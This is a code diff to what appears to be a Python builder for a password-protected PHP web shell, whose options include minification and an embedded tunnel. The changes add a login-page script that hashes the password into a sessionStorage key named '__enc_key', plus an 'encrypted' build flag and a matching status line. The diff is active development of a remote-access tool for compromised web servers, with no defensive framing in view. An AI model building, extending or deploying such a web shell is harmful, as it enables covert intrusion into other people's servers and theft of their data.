@@ -231,7 +231,9 @@ if (empty($_SESSION['__authed'])) {{
     echo '<h2>&#x1F40A; SHELL</h2>';
     echo '<form method="POST"><input type="password" name="__auth_pass" placeholder="Password" autofocus>';
     echo '<button type="submit">Authenticate</button></form>';
-    echo '</div></div></body></html>';
+    echo '</div></div>';
+    echo '<script>document.querySelector("form").addEventListener("submit",function(e){{e.preventDefault();var f=this,pw=f.__auth_pass.value;if(pw&&window.crypto&&window.crypto.subtle){{crypto.subtle.digest("SHA-256",new TextEncoder().encode(pw)).then(function(h){{sessionStorage.setItem("__enc_key",Array.from(new Uint8Array(h)).map(function(b){{return b.toString(16).padStart(2,"0")}}).join(""));f.submit()}})}}else{{f.submit()}}}});</script>';
+    echo '</body></html>';
     exit;
 }}'''
 
@@ -436,6 +438,8 @@ def build(args):
 
     # Generate build metadata
     meta = generate_build_meta(pre_output, args.seed, lang, version)
+    if args.password:
+        meta['encrypted'] = True
 
     # Second pass — inject build meta
     output = pre_output
@@ -470,6 +474,7 @@ def build(args):
     print(f"    Size:      {file_size:,} bytes")
     print(f"    Excluded:  {excluded_str}")
     print(f"    Auth:      {'yes' if args.password else 'no'}")
+    print(f"    Encrypted: {'yes' if args.password else 'no'}")
     print(f"    Tunnel:    {'embedded' if args.tunnel else 'not embedded'}")
     print(f"    Minified:  {'yes' if args.minify else 'no'}")
     print(f"    Theme:     {theme_name}")
